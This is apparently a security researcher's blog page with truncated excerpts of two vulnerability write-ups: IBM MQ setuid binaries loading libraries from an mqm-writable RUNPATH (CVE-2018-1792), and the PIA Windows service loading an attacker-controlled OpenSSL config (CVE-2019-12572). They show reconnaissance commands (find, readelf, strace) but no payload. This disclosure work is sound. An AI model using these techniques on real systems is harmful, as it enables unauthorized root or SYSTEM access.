[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading →](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine — June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Continue reading →](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)


